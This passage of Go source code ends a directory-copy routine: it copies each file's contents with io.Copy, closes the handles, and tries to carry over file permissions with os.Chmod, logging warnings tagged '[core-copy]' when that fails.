				return fmt.Errorf("creating dest file %s: %w", dstPath, errC)
			}

			if _, errCP := io.Copy(dstFile, srcFile); errCP != nil {
				srcFile.Close()
				dstFile.Close() // Close dstFile on error too
				return fmt.Errorf("copying %s to %s: %w", srcPath, dstPath, errCP)
			}
			srcFile.Close() // Close srcFile after successful copy
			dstFile.Close() // Close dstFile after successful copy

			// Attempt to copy file mode
			fileInfo, errI := entry.Info()
			if errI == nil {
				if errC := os.Chmod(dstPath, fileInfo.Mode()); errC != nil {
					log.Printf("[core-copy] Warning: could not chmod %s: %v", dstPath, errC)
				}
			} else {
				log.Printf("[core-copy] Warning: could not get FileInfo for %s to copy mode: %v", srcPath, errI)
			}
		}
	}
	return nil
}
